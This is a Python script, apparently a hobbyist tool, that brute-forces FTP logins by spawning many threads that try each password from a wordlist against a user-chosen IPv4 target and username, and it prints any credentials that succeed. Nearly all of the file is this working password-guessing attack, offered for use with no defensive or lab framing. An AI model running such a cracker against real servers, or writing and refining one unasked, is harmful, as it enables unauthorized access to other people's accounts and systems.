# Multi-threaded FTP cracker using the ftplib library login
# even after finding the password the other threads could be already failing and produce fails
# threads have some overhead so i recommend not adding many threads if your password list is short for clean results
# once a thread has succeeded there will be no more tries but you will have to grep for success between the already
# failing threads that are failing while the one thread succeeding.
# by Hoshea Yarden
import ftplib
import threading
import time

try:
    # validate target
    target_valid = False
    while not target_valid:
        target = input("Enter IPv4 Address ( x.x.x.x | x.isdigit() == True ) ")
        if len(target.split(".")) != 4:
            target_valid = False
            continue
        for octet in target.split("."):
            if not octet.isdigit():
                target_valid = False
                continue
        target_valid = True  # reaching her means target is a valid IPv4 Address

    # validate port
    port = input("Enter Port Number (1 - 65535) ")
    while not port.isdigit():  # python magics
        port = input("Enter Port Number again (1 - 65535) ")
    while not 0 < int(port) < 65535:
        port = input("Enter Port Number again (1 - 65535) ")
    port = int(port)

    # validate thread count
    thread_count = input("Enter the amount of threads (if you put many, after it stops try grepping for \"success\") ")
    while not thread_count.isdigit():
        thread_count = input("Dont be absurd... put a normal number of threads (I recommend between 1 and a million) ")
    while not 0 < int(thread_count) < 9999999:
        thread_count = input("Dont be absurd... put a normal number of threads (I recommend between 1 and a million) ")
    thread_count = int(thread_count)

    # validate file exists without importing os because i keep forgetting about it and i already wrote this section
    passFile = input("Enter path to password file ")
    valid_passfile = False
    while not valid_passfile:
        try:
            open(passFile, 'x')
            valid_passfile = False
            passFile = input("invalid path to password file make sure you type it correctly this time ")
        except FileExistsError:
            valid_passfile = True

    user = input("Enter Username ")
    killswitch = False  # global killswitch to stop spawning threads. Can break the main loop from within an individual thread
    ftp = ftplib.FTP()
except Exception as e:
    print(f"something went wrong: {e}")

# make a new ftp object connect with it and login with it for every function call. if found calls global killswitch.
def login(user, passwd, line):
    try:
        t = threading.current_thread()
        ftp = ftplib.FTP()
        ftp.connect(target, 21, timeout=3)
        status = ftp.lastresp
        ftp.login(user, passwd)
        status = ftp.lastresp
        print(f"status ok -> {status}")
        print(f"success - user:{user}, pass:{passwd}")
        global killswitch
        killswitch = True
        return True

    except:
        print(f"line {line} fail - user:{user}, pass:{passwd}")
        return False

# for each line in a password file, spawn a thread calling ftplogin() while monitoring thread count and the killswitch
try:
    with open(passFile) as my_file:
        threads = []
        no_more_threads_please = True
        line_counter = 0
        for line in my_file:
            if killswitch:
                break
            password = line.replace("\n", "")
            line_counter += 1

            # Q: Too many threads?
            if threading.active_count() > thread_count:
                no_more_threads_please = True

            # A: Enter a waiting loop until not too many threads!
            while no_more_threads_please:
                if threading.active_count() > thread_count:
                    time.sleep(0.001)
                else:
                    no_more_threads_please = False
            # Finally: not too many threads! add another thread!
            x = threading.Thread(target=login, args=(user, password, line_counter))
            threads.append(x)
            x.start()

        # wait for all threads to finish... not sure if this is necessary or not all of this is confusing.
        for index, thread in enumerate(threads):
            thread.join()

except Exception as e:
    print(f"Something went wrong.\n{e}")